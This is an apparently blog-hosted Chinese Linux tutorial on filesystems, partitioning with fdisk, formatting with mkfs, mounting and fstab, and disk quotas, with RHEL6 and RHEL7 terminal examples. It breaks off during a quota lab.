<p>系统目前已加载到内存中支持的文件系统<br><code>more /proc/filesystems</code></p>
<h3 id="文件系统的结构"><a href="#文件系统的结构" class="headerlink" title="文件系统的结构"></a>文件系统的结构</h3><p>索引式文件系统(indexed allocation)</p>
<p><img src="pic/21.png" alt="21"></p>
<p>文件系统内的信息主要有:</p>
<ul>
<li>superblock:记录filesystem的整体信息,包括 inode/block的总量、使用量、剩余量, 以及文件系统的格式等;</li>
<li>inode:记录文件属性,一个文件占一个inode,同时记录该文件数据所在的block 号码;</li>
<li>block:实际记录文件的内容,若档案太大时,会占用多个 block</li>
</ul>
<h3 id="文件系统的区别"><a href="#文件系统的区别" class="headerlink" title="文件系统的区别"></a>文件系统的区别</h3><p>rhel6</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# mkfs</span><br><span class="line">mkfs          mkfs.ext2     mkfs.ext4     mkfs.msdos    </span><br><span class="line">mkfs.cramfs   mkfs.ext3     mkfs.ext4dev  mkfs.vfat</span><br></pre></td></tr></table></figure>
<p>rhel7</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# mkfs</span><br><span class="line">mkfs         mkfs.cramfs  mkfs.ext3    mkfs.fat     mkfs.msdos   mkfs.xfs     </span><br><span class="line">mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.minix   mkfs.vfat</span><br></pre></td></tr></table></figure>

<p>EXT4 Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能，不向下兼容ext3。</p>
<p>XFS 针对海量小文件的存储及超大文件的存储有一些有时,但 EXT 系统相对稳定。XFS 是 Silicon Graphics，Inc. 于 90 年代初开发的文件系统。它至今仍作为 SGI 基于 IRIX 的产品（从工作站到超级计算机）的底层文件系统来使用。现在，XFS 也可以用于 Linux。XFS 的 Linux 版的到来是激动人心的，首先因为它为 Linux 社区提供了一种健壮的、优秀的以及功能丰富的文件系统，并且这种文件系统所具有的可伸缩性能够满足最苛刻的存储需求。</p>
<h3 id="文件系统的简单操作"><a href="#文件系统的简单操作" class="headerlink" title="文件系统的简单操作"></a>文件系统的简单操作</h3><p><img src="pic/22.png" alt="22"></p>
<h4 id="df"><a href="#df" class="headerlink" title="df"></a>df</h4><p><img src="pic/23.png" alt="23"></p>
<p>实例：</p>
<ol>
<li>使用-h选项以KB以上的单位来显示，可读性高<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">3<span class="comment">#root@rhel6 ~]#df -h</span></span></span><br><span class="line">Filesystem                     Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/vg_rhel6-LogVol01   17G  3.0G   13G  19% /</span><br><span class="line">tmpfs                          499M   72K  499M   1% /dev/shm</span><br><span class="line">/dev/vda1                      477M   58M  390M  13% /boot</span><br><span class="line">/dev/mapper/vg_rhel6-LogVol00  380M  2.3M  354M   1% /home</span><br></pre></td></tr></table></figure></li>
<li>查看全部文件系统：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">4<span class="comment">#root@rhel6 ~]#df -a</span></span></span><br><span class="line">Filesystem                    1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/mapper/vg_rhel6-LogVol01  17535796 3127044  13494936  19% /</span><br><span class="line">proc                                  0       0         0    - /proc</span><br><span class="line">sysfs                                 0       0         0    - /sys</span><br><span class="line">devpts                                0       0         0    - /dev/pts</span><br><span class="line">tmpfs                            510368      72    510296   1% /dev/shm</span><br><span class="line">/dev/vda1                        487652   58631    399325  13% /boot</span><br><span class="line">/dev/mapper/vg_rhel6-LogVol00    388480    2335    361569   1% /home</span><br><span class="line">none                                  0       0         0    - /proc/sys/fs/binfmt_misc</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="du"><a href="#du" class="headerlink" title="du"></a>du</h4><p><img src="pic/24.png" alt="24"></p>
<p>实例：</p>
<ol>
<li>查看指定目录所占空间<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">9<span class="comment">#root@rhel6 ~]#du -s /var/</span></span></span><br><span class="line">140252	/var/</span><br><span class="line"><span class="meta">[#</span><span class="bash">10<span class="comment">#root@rhel6 ~]#du -sh /var/</span></span></span><br><span class="line">137M	/var/</span><br></pre></td></tr></table></figure></li>
<li>查看指定目录下的所有文件，包括隐藏文件<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">16<span class="comment">#root@rhel6 ~]#du -h /tmp</span></span></span><br><span class="line">8.0K	/tmp/pulse-oCBy0hGD1JT6</span><br><span class="line">4.0K	/tmp/.X11-unix</span><br><span class="line">4.0K	/tmp/.esd-0</span><br><span class="line">4.0K	/tmp/virtual-root.JyC7Qb</span><br><span class="line">8.0K	/tmp/orbit-gdm</span><br><span class="line">4.0K	/tmp/.ICE-unix</span><br><span class="line">8.0K	/tmp/pulse-q5sECpImz7Ju</span><br><span class="line">48K	/tmp</span><br><span class="line"><span class="meta">[#</span><span class="bash">15<span class="comment">#root@rhel6 ~]#du -ha /tmp</span></span></span><br><span class="line">4.0K	/tmp/pulse-oCBy0hGD1JT6/pid</span><br><span class="line">0	/tmp/pulse-oCBy0hGD1JT6/native</span><br><span class="line">8.0K	/tmp/pulse-oCBy0hGD1JT6</span><br><span class="line">0	/tmp/.X11-unix/X0</span><br><span class="line">4.0K	/tmp/.X11-unix</span><br><span class="line">0	/tmp/.esd-0/socket</span><br><span class="line">4.0K	/tmp/.esd-0</span><br><span class="line">4.0K	/tmp/virtual-root.JyC7Qb</span><br><span class="line">4.0K	/tmp/.X0-lock</span><br><span class="line">0	/tmp/orbit-gdm/linc-6c2-0-7846478690c68</span><br><span class="line">0	/tmp/orbit-gdm/bonobo-activation-register-75c59b1ecf3edd6ad04cfcfd00000056.lock</span><br><span class="line">4.0K	/tmp/orbit-gdm/bonobo-activation-server-75c59b1ecf3edd6ad04cfcfd00000056-ior</span><br><span class="line">0	/tmp/orbit-gdm/linc-6e5-0-3bda60586d2f0</span><br><span class="line">0	/tmp/orbit-gdm/linc-6bb-0-2bf2fd0bb015c</span><br><span class="line">0	/tmp/orbit-gdm/linc-6e1-0-44f3459db98f9</span><br><span class="line">0	/tmp/orbit-gdm/linc-6d9-0-26db8cdee8dec</span><br><span class="line">0	/tmp/orbit-gdm/linc-6e0-0-7f7b8d4664593</span><br><span class="line">0	/tmp/orbit-gdm/linc-6e4-0-540f978681aee</span><br><span class="line">0	/tmp/orbit-gdm/linc-6d4-0-3a04cbe9566</span><br><span class="line">0	/tmp/orbit-gdm/linc-6d5-0-75caf0f81ab48</span><br><span class="line">8.0K	/tmp/orbit-gdm</span><br><span class="line">0	/tmp/.ICE-unix/1723</span><br><span class="line">4.0K	/tmp/.ICE-unix</span><br><span class="line">4.0K	/tmp/pulse-q5sECpImz7Ju/pid</span><br><span class="line">0	/tmp/pulse-q5sECpImz7Ju/native</span><br><span class="line">8.0K	/tmp/pulse-q5sECpImz7Ju</span><br><span class="line">48K	/tmp</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="磁盘的分割、格式化与挂载"><a href="#磁盘的分割、格式化与挂载" class="headerlink" title="磁盘的分割、格式化与挂载"></a>磁盘的分割、格式化与挂载</h2><p>新增一颗硬盘时 , 该怎么做 :</p>
<ol>
<li>对磁盘进行分割 , 以建立可用的分区 partition ; <fdisk></li>
<li>对该 partition 进行格式化 ( format ), 以建立系统可用的文件系统 filesystem;<mkfs></li>
<li>若想要仔细一点 , 则可对刚刚建立好的 filesystem 进行检验 ;&lt;fsck, badblocks&gt;</li>
<li>在 Linux 系统上 , 需要建立挂载点 ( 目录 ), 并将他挂载上来。 <mount></li>
<li>如果 ll /dev/ 新建的分区不存在,则使用 partx -a /dev/vdb 让新建的分区被读取生效,或者重启电脑</li>
</ol>
<h3 id="分割-fdisk"><a href="#分割-fdisk" class="headerlink" title="分割 fdisk"></a>分割 fdisk</h3><p>fdisk命令用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面。</p>
<p>语法 fdisk(选项)(参数)</p>
<p>选项</p>
<ul>
<li>-b&lt;分区大小&gt;：指定每个分区的大小；</li>
<li>-l：列出指定的外围设备的分区表状况；</li>
<li>-s&lt;分区编号&gt;：将指定的分区大小输出到标准输出上，单位为区块；</li>
<li>-u：搭配”-l”参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址；</li>
<li>-v：显示版本信息。</li>
</ul>
<p>参数 设备文件：指定要进行分区或者显示分区的硬盘设备文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">20<span class="comment">#root@rhel6 ~]#fdisk -l</span></span></span><br><span class="line"></span><br><span class="line">Disk /dev/vda: 21.5 GB, 21474836480 bytes</span><br><span class="line">16 heads, 63 sectors/track, 41610 cylinders</span><br><span class="line">Units = cylinders of 1008 * 512 = 516096 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x000d166b</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vda1   *           3        1018      512000   83  Linux</span><br><span class="line">Partition 1 does not end on cylinder boundary.</span><br><span class="line">/dev/vda2            1018        5179     2097152   82  Linux swap / Solaris</span><br><span class="line">Partition 2 does not end on cylinder boundary.</span><br><span class="line">/dev/vda3            5179       41611    18361344   8e  Linux LVM</span><br><span class="line">Partition 3 does not end on cylinder boundary.</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 10.7 GB, 10737418240 bytes</span><br><span class="line">16 heads, 63 sectors/track, 20805 cylinders</span><br><span class="line">Units = cylinders of 1008 * 512 = 516096 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_rhel6-LogVol01: 18.4 GB, 18379440128 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2234 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_rhel6-LogVol00: 419 MB, 419430400 bytes</span><br><span class="line">255 heads, 63 sectors/track, 50 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"><span class="meta">[#</span><span class="bash">21<span class="comment">#root@rhel6 ~]#fdisk /dev/vdb</span></span></span><br><span class="line">Device contains neither a valid DOS partition table, nor Sun, SGI or OSF disklabel</span><br><span class="line">Building a new DOS disklabel with disk identifier 0x23c41712.</span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">After that, of course, the previous content won't be recoverable.</span><br><span class="line"></span><br><span class="line">Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)</span><br><span class="line"></span><br><span class="line">WARNING: DOS-compatible mode is deprecated. It's strongly recommended to</span><br><span class="line">         switch off the mode (command 'c') and change display units to</span><br><span class="line">         sectors (command 'u').</span><br><span class="line"></span><br><span class="line">Command (m for help): m &lt;== 输入 m 后 , 就会看到底下这些指令介绍</span><br><span class="line">Command action</span><br><span class="line">a toggle a bootable flag</span><br><span class="line">b edit bsd disklabel</span><br><span class="line">c toggle the dos compatibility flag</span><br><span class="line">d delete a partition &lt;== 删除一个分区</span><br><span class="line">l list known partition types</span><br><span class="line">m print this menu</span><br><span class="line">n add a new partition &lt;== 新增一个分区</span><br><span class="line">o create a new empty DOS partition table</span><br><span class="line">p print the partition table== 在屏幕上显示分割表</span><br><span class="line">q quit without saving changes&lt;== 不储存离开 fdisk 程序</span><br><span class="line">s create a new empty Sun disklabel</span><br><span class="line">t change a partition's system id</span><br><span class="line">u change display/entry units</span><br><span class="line">v verify the partition table</span><br><span class="line">w write table to disk and exit&lt;== 将刚刚的动作写入分割表</span><br><span class="line">x extra functionality (experts only)</span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 10.7 GB, 10737418240 bytes</span><br><span class="line">16 heads, 63 sectors/track, 20805 cylinders</span><br><span class="line">Units = cylinders of 1008 * 512 = 516096 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x23c41712</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line"></span><br><span class="line">Command (m for help): n</span><br><span class="line">Command action</span><br><span class="line">   e   extended</span><br><span class="line">   p   primary partition (1-4)</span><br><span class="line">p</span><br><span class="line">Partition number (1-4): 1</span><br><span class="line">First cylinder (1-20805, default 1):</span><br><span class="line">Using default value 1</span><br><span class="line">Last cylinder, +cylinders or +size&#123;K,M,G&#125; (1-20805, default 20805):</span><br><span class="line">Using default value 20805</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 10.7 GB, 10737418240 bytes</span><br><span class="line">16 heads, 63 sectors/track, 20805 cylinders</span><br><span class="line">Units = cylinders of 1008 * 512 = 516096 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x23c41712</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vdb1               1       20805    10485688+  83  Linux</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br><span class="line"><span class="meta">[#</span><span class="bash">22<span class="comment">#root@rhel6 ~]#ls /dev|grep vdb</span></span></span><br><span class="line">vdb</span><br><span class="line">vdb1</span><br><span class="line">[root@rhel7 ~]# fdisk /dev/vdb</span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line"></span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table</span><br><span class="line">Building a new DOS disklabel with disk identifier 0x8366bb08.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x8366bb08</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line"></span><br><span class="line">Command (m for help): n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p</span><br><span class="line">Partition number (1-4, default 1): 1</span><br><span class="line">First sector (2048-20971519, default 2048):</span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-20971519, default 20971519):</span><br><span class="line">Using default value 20971519</span><br><span class="line">Partition 1 of type Linux and of size 10 GiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x8366bb08</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vdb1            2048    20971519    10484736   83  Linux</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure>

<h3 id="磁盘格式化-mkfs"><a href="#磁盘格式化-mkfs" class="headerlink" title="磁盘格式化 mkfs"></a>磁盘格式化 mkfs</h3><p><img src="pic/25.png" alt="25"></p>
<ol>
<li><p>rhel6实例：查看支持的文件系统；将/dev/vdb1格式化成ext4文件系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">23<span class="comment">#root@rhel6 ~]#mkfs</span></span></span><br><span class="line">mkfs          mkfs.cramfs   mkfs.ext2     mkfs.ext3     mkfs.ext4     mkfs.ext4dev  mkfs.msdos    mkfs.vfat</span><br><span class="line"><span class="meta">[#</span><span class="bash">24<span class="comment">#root@rhel6 ~]#mkfs.ext4 /dev/vdb1</span></span></span><br><span class="line">mke2fs 1.41.12 (17-May-2010)</span><br><span class="line">Filesystem label=</span><br><span class="line">OS type: Linux</span><br><span class="line">Block size=4096 (log=2)</span><br><span class="line">Fragment size=4096 (log=2)</span><br><span class="line">Stride=0 blocks, Stripe width=0 blocks</span><br><span class="line">655360 inodes, 2621422 blocks</span><br><span class="line">131071 blocks (5.00%) reserved for the super user</span><br><span class="line">First data block=0</span><br><span class="line">Maximum filesystem blocks=2684354560</span><br><span class="line">80 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per group</span><br><span class="line">8192 inodes per group</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632</span><br><span class="line">Writing inode tables: done                            </span><br><span class="line">Creating journal (32768 blocks): done</span><br><span class="line">Writing superblocks and filesystem accounting information: done</span><br><span class="line">This filesystem will be automatically checked every 38 mounts or</span><br><span class="line">180 days, whichever comes first.  Use tune2fs -c or -i to override.</span><br></pre></td></tr></table></figure>
</li>
<li><p>rhel7实例：查看支持的文件系统；将/dev/vdb1格式化成xfs文件系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# mkfs</span><br><span class="line">mkfs         mkfs.cramfs  mkfs.ext3    mkfs.fat     mkfs.msdos   mkfs.xfs     </span><br><span class="line">mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.minix   mkfs.vfat    </span><br><span class="line">[root@rhel7 ~]# mkfs.xfs /dev/vdb1</span><br><span class="line">meta-data=/dev/vdb1              isize=256    agcount=4, agsize=655296 blks</span><br><span class="line">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="line">         =                       crc=0</span><br><span class="line">data     =                       bsize=4096   blocks=2621184, imaxpct=25</span><br><span class="line">         =                       sunit=0      swidth=0 blks</span><br><span class="line">naming   =version 2              bsize=4096   ascii-ci=0 ftype=0</span><br><span class="line">log      =internal log           bsize=4096   blocks=2560, version=2</span><br><span class="line">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="line">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><p>/etc/fstab</p>
<p>/etc/filesystems: 系统指定的测试挂载文件系统类型 ;</p>
<p>/proc/filesystems:Linux 系统已经加载的文件系统类型。</p>
<h4 id="mount-的用法"><a href="#mount-的用法" class="headerlink" title="mount 的用法"></a>mount 的用法</h4><p>1) 标准用法 <code>mount -t ext4 /dev/vdb1 /mnt/vdb1</code></p>
<p>2) 远程挂载 <code>mount ip:/xx /xx</code></p>
<pre><code>`mount 172.25.254.250 : /content /mnt` &lt;== 远程挂载案例</code></pre><p>3) 其他选项:</p>
<p>A.-o loop 挂载镜像文件</p>
<ul>
<li>用法: mount -o loop 被挂载的文件 挂载点</li>
<li>例如: mount -o loop rhel-server-6.5-x86_64-dvd.iso /test</li>
</ul>
<p>B.-o ro 以只读方式挂载</p>
<ul>
<li>用法: mount -o ro 被挂在的设备 挂载点</li>
<li>例如: mount -o ro /dev/vdb1 /test</li>
</ul>
<p>C.-o remount 重新挂载</p>
<ul>
<li><p>用法: mount -o remount 被挂载的设备 挂载点</p>
</li>
<li><p>例如: mount -o remount,rw,auto / &lt;== 重新挂载根目录</p>
<p>mount -o remount,ro newdir &lt;== 重新挂载为只读</p>
</li>
</ul>
<p>D.-t iso9660 挂载CD/DVD</p>
<ul>
<li>用法: mount -t iso9660 被挂载的设备 挂载点</li>
<li>例如: mount -t iso9660 /dev/dvdrom /media/dvdrom</li>
</ul>
<h4 id="mount-的查看"><a href="#mount-的查看" class="headerlink" title="mount 的查看"></a>mount 的查看</h4><p>df -h</p>
<p>mount &lt;== 查看设备和目录挂载点的关系</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">27<span class="comment">#root@rhel6 ~]#mount</span></span></span><br><span class="line">/dev/mapper/vg_rhel6-LogVol01 on / type ext4 (rw)</span><br><span class="line">proc on /proc type proc (rw)</span><br><span class="line">sysfs on /sys type sysfs (rw)</span><br><span class="line">devpts on /dev/pts type devpts (rw,gid=5,mode=620)</span><br><span class="line">tmpfs on /dev/shm type tmpfs (rw,rootcontext="system_u:object_r:tmpfs_t:s0")</span><br><span class="line">/dev/vda1 on /boot type ext4 (rw)</span><br><span class="line">/dev/mapper/vg_rhel6-LogVol00 on /home type ext4 (rw)</span><br><span class="line">none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)</span><br></pre></td></tr></table></figure>

<h4 id="umount"><a href="#umount" class="headerlink" title="umount"></a>umount</h4><p>umount [-fn] 设备文件名与挂载点</p>
<p>umount /mnt</p>
<p>注意事项:</p>
<ol>
<li>对某个挂载点使用多次 mount ,会把之前的内容隐藏起来,只能看到最后一次挂载的设备文件里的内容</li>
<li>不要在挂载点里面执行 umount 命令,会报错</li>
<li>尽量不要在挂载点里执行 mount 挂载命令</li>
<li>mount 命令为临时生效</li>
</ol>
<h3 id="etc-fstab-将永久生效"><a href="#etc-fstab-将永久生效" class="headerlink" title="/etc/fstab 将永久生效"></a>/etc/fstab 将永久生效</h3><p><img src="pic/26.png" alt="26"></p>
<p>是否需要检测:非 0 代表检测,数字越小优先级越高</p>
<p>修改后保存,通过 <code>mount -a</code>让配置生效</p>
<h2 id="磁盘配额-Quota"><a href="#磁盘配额-Quota" class="headerlink" title="磁盘配额 Quota"></a>磁盘配额 Quota</h2><p>如前面介绍章节讲到的类 Unix 系统最初设计理念就让许多人一起使用,多任务的操作系统,但是硬件的资源是固定有限 的,如果出现个小破坏份子不断的创建文件或下载电影,那么硬盘空间总有一天会被占满的吧,这时就需要 quota服务 帮助我们为每个用户限制可以使用的硬盘空间,一旦超出预算就不再允许他们使用。</p>
<h3 id="作用和分类"><a href="#作用和分类" class="headerlink" title="作用和分类"></a>作用和分类</h3><p>quota 的磁盘配额可以限制用户的硬盘可用空间或最大创建文件数量,并且还有软/硬限制的区别:</p>
<ul>
<li>软限制:当达到软限制时会提示用户,但允许用户在规定期限内继续使用。</li>
<li>硬限制:当达到硬限制时会提示用户,且强制终止用户的操作。</li>
</ul>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="quotacheck"><a href="#quotacheck" class="headerlink" title="quotacheck"></a>quotacheck</h4><p>quotacheck命令通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行quotacheck指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生quota.user和quota.group文件，设置用户和群组的磁盘空间限制。</p>
<p>语法 quotacheck(选项)(参数)</p>
<p>选项</p>
<ul>
<li>-a：扫描在/etc/fstab文件里，有加入quota设置的分区；</li>
<li>-d：详细显示指令执行过程，便于排错或了解程序执行的情形；</li>
<li>-g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目；</li>
<li>-R：排除根目录所在的分区；</li>
<li>-u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目；</li>
<li>-v：显示指令执行过程。</li>
</ul>
<p>参数 文件系统：指定要扫描的文件系统。</p>
<h4 id="quota"><a href="#quota" class="headerlink" title="quota"></a>quota</h4><p>quota命令用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。</p>
<p>语法 quota(选项)(参数)</p>
<p>选项</p>
<ul>
<li>-g：列出群组的磁盘空间限制；</li>
<li>-q：简明列表，只列出超过限制的部分；</li>
<li>-u：列出用户的磁盘空间限制；</li>
<li>-v：显示该用户或群组，在所有挂入系统的存储设备的空间限制；</li>
<li>-V：显示版本信息。</li>
</ul>
<p>参数 用户或者工作组：指定要显示的用户或者工作组。</p>
<h4 id="quotaon"><a href="#quotaon" class="headerlink" title="quotaon"></a>quotaon</h4><p>quotaon命令用于激活Linux内核中指定文件系统的磁盘配额功能。</p>
<p>语法 quotaon(选项)(参数)</p>
<p>选项</p>
<ul>
<li>-a：开启在/ect/fstab文件里，有加入quota设置的分区的空间限制；</li>
<li>-g：开启群组的磁盘空间限制；</li>
<li>-u：开启用户的磁盘空间限制；</li>
<li>-v：显示指令指令执行过程。</li>
</ul>
<p>参数 文件系统：指定要激活磁盘配额功能的文件系统。</p>
<h4 id="repquota"><a href="#repquota" class="headerlink" title="repquota"></a>repquota</h4><p>repquota命令以报表的格式输出指定分区，或者文件系统的磁盘配额信息。</p>
<p>语法 repquota(选项)(参数)</p>
<p>选项</p>
<ul>
<li>-a：列出在/etc/fstab文件里，有加入quota设置的分区的使用状况，包括用户和群组；</li>
<li>-g：列出所有群组的磁盘空间限制；</li>
<li>-u：列出所有用户的磁盘空间限制；</li>
<li>-v：显示该用户或群组的所有空间限制。</li>
</ul>
<p>参数 文件系统：要打印报表的文件系统或者对应的设备文件名。</p>
<h4 id="edquota"><a href="#edquota" class="headerlink" title="edquota"></a>edquota</h4><p>edquota 命令用于超级用户编辑其他用户的 quota 配额限制</p>
<p>格式为: “ edquota [参数] [用户]”。</p>
<p>参数 作用</p>
<ul>
<li>-u 编辑用户的配额限制。</li>
<li>-g 编辑用户组的配额限制。</li>
<li>-r 通过 RPC 协议编辑远程的配额。</li>
</ul>
<h4 id="xfs-quota"><a href="#xfs-quota" class="headerlink" title="xfs_quota"></a>xfs_quota</h4><p>xfs_quota 命令用于管理 XFS 文件系统的 quota 硬盘配额</p>
<p>格式为: “ quota [参数] 配额 文件系统 ” 。</p>
<p>参数 作用</p>
<ul>
<li>-c 命令 以交换式或参数的形式设置要执行的命令。</li>
<li>-p 设置提示或报错信息的程序名称,默认为 xfs_quota。</li>
<li>-x 专家模式,能够对 quota 做更多复杂的配置。</li>
</ul>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="rhel6-quota实验"><a href="#rhel6-quota实验" class="headerlink" title="rhel6 quota实验"></a>rhel6 quota实验</h4><p>划分分区/dev/vdb2，格式化成ext4文件系统，并挂载在student家目录下使用，限制磁盘软限制为 3M、磁盘硬限制为 6M、文件软限制为 20 个且文件硬限制为 30 个</p>
<ol>
<li>挂载时需要加上 -o usrquota,grpquota 选项 ：mount -o usrquota,grpquota /dev/vdb2 /home/student</li>
<li>/etc/skel 需要的文件需要复制到家目录下 ：cp .bash* .gnome2 .mozilla -r /home/student</li>
<li>修改家目录权限 ：chown student.student /home/student ;setenforce 0</li>
<li>检测:quotacheck -cugm /home/student/ 检测结果 : aquota.group aquota.user &lt;== 只有 root 用户有读写权限</li>
<li>激活 :quotaon /home/student</li>
<li>打印磁盘配额的报告 :repquota /home/student</li>
<li>编辑edquota student</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# mount -o usrquota,grpquota /dev/vdb2 /home/student</span><br><span class="line">[root@rhel6 ~]# ll /home/student</span><br><span class="line">total 16</span><br><span class="line">drwx------. 2 root root 16384 Jul  1 15:56 lost+found</span><br><span class="line">[root@rhel6 ~]# cd /etc/skel</span><br><span class="line">[root@rhel6 skel]# cp .bash* .gnome* .moz* -r /home/student</span><br><span class="line">[root@rhel6 skel]# ll /home/student -a</span><br><span class="line">total 42</span><br><span class="line">drwxr-xr-x. 5 root root  4096 Jul  1 16:00 .</span><br><span class="line">drwxr-xr-x. 4 root root  1024 Jul  2  2015 ..</span><br><span class="line">-rw-r--r--. 1 root root    18 Jul  1 16:00 .bash_logout</span><br><span class="line">-rw-r--r--. 1 root root   176 Jul  1 16:00 .bash_profile</span><br><span class="line">-rw-r--r--. 1 root root   124 Jul  1 16:00 .bashrc</span><br><span class="line">drwxr-xr-x. 2 root root  4096 Jul  1 16:00 .gnome2</span><br><span class="line">drwx------. 2 root root 16384 Jul  1 15:56 lost+found</span><br><span class="line">drwxr-xr-x. 4 root root  4096 Jul  1 16:00 .mozilla</span><br><span class="line">[root@rhel6 skel]# chown student. /home/student -R</span><br><span class="line">[root@rhel6 skel]# setenforce 0</span><br><span 